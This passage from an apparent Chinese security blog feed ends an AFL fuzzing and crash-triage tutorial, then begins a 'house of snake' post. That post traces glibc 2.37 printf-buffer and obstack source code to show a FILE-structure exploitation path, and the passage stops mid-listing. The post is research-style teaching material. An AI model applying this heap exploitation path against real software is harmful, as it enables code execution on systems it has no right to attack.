class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b ./afl-whatsup ./afl_test</span><br><span class="line">status check tool <span class="keyword">for</span> afl-fuzz by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">Individual fuzzers</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">test</span> (0 days, 0 hrs) &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">  <span class="string">cycle 1, lifetime speed 2 execs/sec, path 0/3 (0%)</span></span><br><span class="line"><span class="string">  pending 2/3, coverage 0.05%, no crashes yet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary stats</span></span><br><span class="line"><span class="string">=============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Fuzzers alive : 1</span></span><br><span class="line"><span class="string">      Total run time : 0 days, 0 hours</span></span><br><span class="line"><span class="string">         Total execs : 0 million</span></span><br><span class="line"><span class="string">    Cumulative speed : 2 execs/sec</span></span><br><span class="line"><span class="string">       Pending paths : 2 faves, 3 total</span></span><br><span class="line"><span class="string">       Crashes found : 0 locally unique</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">➜  afl-2.52b ./afl-whatsup ./afl_test</span></span><br><span class="line"><span class="string">status check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Individual fuzzers</span></span><br><span class="line"><span class="string">==================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  cycle</span> 96, lifetime speed 1480 execs/sec, path 3/4 (75%)</span><br><span class="line">  pending 0/0, coverage 0.05%, crash count 3 (!)</span><br><span class="line"></span><br><span class="line">Summary stats</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">       Fuzzers alive : 1</span><br><span class="line">      Total run time : 0 days, 0 hours</span><br><span class="line">         Total execs : 0 million</span><br><span class="line">    Cumulative speed : 1480 execs/sec</span><br><span class="line">       Pending paths : 0 faves, 0 total</span><br><span class="line">       Crashes found : 3 locally unique</span><br></pre></td></tr></table></figure><p>虽然但是，我感觉我这里好像使用有问题，但是先不管那么多了。</p><p>再简单介绍一下<code>afl-plot</code>，这个工具总结出来的内容更为直观，可以直接图形化显示。这里存在一定依赖问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnuplot</span><br><span class="line">afl-plot afl_state_dir graph_output_dir</span><br></pre></td></tr></table></figure><p>下面就是输出出来的结果，但是不知道为什么这里的<code>total paths</code>没有显示，我猜测可能是因为这里不是使用<code>afl-gcc</code>进行编译或者就是我的电脑性能太拉了。这里的<code>uniq crashes</code>开始在增加随后逐渐趋于平稳。最后一个就是执行速度，随着时间的推移也是越来越慢了，当然也可能是因为占用了太多的系统资源。<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323142824705.png"                      alt="image-20230323142824705"                ></p><p>然后再说说pythia插件吧，这个插件可以看到发现新的crash和path的概率。他与原版也只是差了几个字段。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323153710947.png"                      alt="image-20230323153710947"                ></p><p>这里在<code>process timing</code>里面框中出现了两个新的字段分别是<code>correctiness</code>和<code>fuzzability</code>，他们的含义分别是在没有发现crash时，发现一个导致crash输入的概率，表示在该程序中发现新路径的难度，该数值越高代表程序越容易Fuzz。在<code>overall results</code>框中也多了两个，第一个是当前发现的路径，一个是路径覆盖率。</p><h2 id="何时关闭fuzz"><a href="#何时关闭fuzz" class="headerlink" title="何时关闭fuzz"></a>何时关闭fuzz</h2><p>用过就能知道的是fuzz其实是无限执行下去的，这里可以用上面的几种方法来观察是否该结束，当然这里也可以直接在原始的AFL中看到何时该结束，注意这里<code>cycles done</code>的颜色，在fuzz的过程中这个颜色是一直会变化的，可以看到上面的图中颜色为紫色，这里为蓝色。所以他的变化顺序为紫色-&gt;黄色-&gt;蓝色-&gt;绿色，当为绿色是就代表很难再找到新的crash了，而这个时候就可以结束了。(下图为蓝色主要是受我电脑性能影响的)<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323140202009.png"                      alt="image-20230323140202009"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  output_dir tree</span><br><span class="line">.</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000001,op:havoc,rep:64</span><br><span class="line">│   ├── id:000001,sig:11,src:000000,op:flip1,pos:1</span><br><span class="line">│   ├── id:000002,sig:11,src:000000,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:in.txt</span><br><span class="line">    ├── id:000001,orig:in1.txt</span><br><span class="line">    ├── id:000002,orig:in2.txt</span><br><span class="line">    └── id:000003,src:000001,op:arith8,pos:0,val:-27,+cov</span><br></pre></td></tr></table></figure><p>queue：存放所有具有独特执行路径的测试用例。<br>crashes：导致目标接收致命signal而崩溃的独特测试用例。<br>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。<br>hangs：导致目标超时的独特测试用例。<br>fuzzer_stats：afl-fuzz的运行状态。<br>plot_data：用于afl-plot绘图。</p><h2 id="处理测试结果"><a href="#处理测试结果" class="headerlink" title="处理测试结果"></a>处理测试结果</h2><p>这里只介绍两种方式，一是<code>crashwalk</code>再就是<code>afl-collect</code></p><h3 id="crashwalk"><a href="#crashwalk" class="headerlink" title="crashwalk"></a>crashwalk</h3><p>安装过程这里就不再说了，网上很多，搜搜就有。</p><p>首先这个有两种模式，一是<code>Manual Mode</code>其次就是<code>AFL Mode</code>，他们的命令新式分别如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@</span><br><span class="line">~/tools/go/bin/cwtriage -root syncdir -afl</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323190851304.png"                      alt="image-20230323190851304"                ></p><p>这里使用的是第一种方式(用AFL时我这里会出现无法<code>no crash detected</code>错误)。</p><p>可以看到这里的描述中写上了栈溢出漏洞。</p><h3 id="afl-collect"><a href="#afl-collect" class="headerlink" title="afl-collect"></a>afl-collect</h3><p>这个工具使用命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323195200830.png"                      alt="image-20230323195200830"                ></p><p>结果比上面的更为直观。</p><h2 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h2><p>代码覆盖率是模糊测试中一个极其重要的概念，使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。</p><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的<a class="link"   href="https://clang.llvm.org/docs/SanitizerCoverage.html" >官方文档<i class="fas fa-external-link-alt"></i></a>。</p><h3 id="基本块"><a href="#基本块" class="headerlink" title="基本块"></a>基本块</h3><blockquote><p>只有一个入口点，BB中的指令不是任何<strong>跳转指令</strong>的目标。</p><p>只有一个退出点，只有最后一条指令使执行流程转移到另一个BB</p></blockquote><p>如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/1552285577000-006tNc79gy1fz1gm5zohnj30sj0ikahx.jpg-w331s.jpg"                                     ></p><p>拿一个程序举例，在ida中每一块就代表一个基本块。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200531347.png"                      alt="image-20230323200531347"                ></p><h3 id="边"><a href="#边" class="headerlink" title="边"></a>边</h3><p>依旧是上面ida的图，每一条线，也就是每一个箭头就代表一个边。</p><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>在AFL中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong>的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;            <span class="comment">//用一个随机数标记当前基本块</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;        <span class="comment">//将当前块和前一块异或保存到shared_mem[]</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;                <span class="comment">//cur_location右移1位区分从当前块到当前块的转跳</span></span><br></pre></td></tr></table></figure><p>实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置rcx，然后调用<code>__afl_maybe_log</code>，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200655405.png"                      alt="image-20230323200655405"                ></p><h2 id="计算代码覆盖率"><a href="#计算代码覆盖率" class="headerlink" title="计算代码覆盖率"></a>计算代码覆盖率</h2><p>这里计算代码覆盖率主要是介绍两个工具，一是GCOV另一个则是LCOV它是GCOV的前端。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214327472.png"                      alt="image-20230323214327472"                ></p><p>可以看到这里有覆盖率之类的东西，当然也可以在网页中打开</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214409463.png"                      alt="image-20230323214409463"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214533298.png"                      alt="image-20230323214533298"                ></p><p>点开文件会有更为详细的数据，每行代码前的数字代表被执行的次数，其中红色的代表未执行过的。</p><hr><p>参考链接:<br>    <a class="link"   href="https://paper.seebug.org/842/#4-afl-collect" >https://paper.seebug.org/842/#4-afl-collect<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。&lt;/p&gt;
&lt;h2 id=&quot;fuzzer工作状态&quot;&gt;&lt;a href=&quot;#fuzzer工作状态&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>house of snake</title>
    <link href="https://cv196082.gitee.io/2023/03/22/house-of-snake/"/>
    <id>https://cv196082.gitee.io/2023/03/22/house-of-snake/</id>
    <published>2023-03-22T05:32:33.000Z</published>
    <updated>2023-03-23T12:11:46.982Z</updated>
    
    <content type="html"><![CDATA[<p>这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>在glibc2.37中<code>_IO_obstack_jumps</code>被删除啦，导致前一篇的利用方式无了。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这次聚焦的vtable是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这里只有两个函数，并且我们真正使用的只有第一个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (struct __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数一来就是一个强制类型转化为<code>__printf_buffer_as_file</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到这个结构体的前面两个成员其实就相当于<code>_IO_FILE_plus</code>结构体，再在后面跟了一个指针。</p><p>这个函数的目标是执行到<code>__printf_buffer_flush</code>，所以需要通过前面的验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"> </span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_putc (struct __printf_buffer *buf, <span class="keyword">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第一个函数中就是验证了next指针的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *write_base;</span><br><span class="line">  <span class="keyword">char</span> *write_ptr;</span><br><span class="line">  <span class="keyword">char</span> *write_end;</span><br><span class="line">  <span class="keyword">uint64_t</span> written;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Identifies the flush callback.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>成功绕过上面的判断之后进入下面这个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_do_flush (struct __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((struct __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((struct __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最终目标是<code>__printf_buffer_flush_obstack</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment"> process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      buf-&gt;base.write_base = obstack_next_free (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_ptr = buf-&gt;base.write_base;</span><br><span class="line">      <span class="keyword">size_t</span> size = obstack_room (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_end = buf-&gt;base.write_ptr + size;</span><br><span class="line">      <span class="comment">/* Reserve the space on the obstack size.  */</span></span><br><span class="line">      obstack_blank_fast (buf-&gt;obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Obtain the extra character.  */</span></span><br><span class="line">      buf-&gt;base.write_base = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_ptr = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_end = &amp;buf-&gt;ch + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的目标就是<code>obstack_1grow</code>，前面的绕过方式很简单，直接绕过就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>然后执行这个宏，宏中就有了我们熟悉的<code>_obstack_newchunk</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 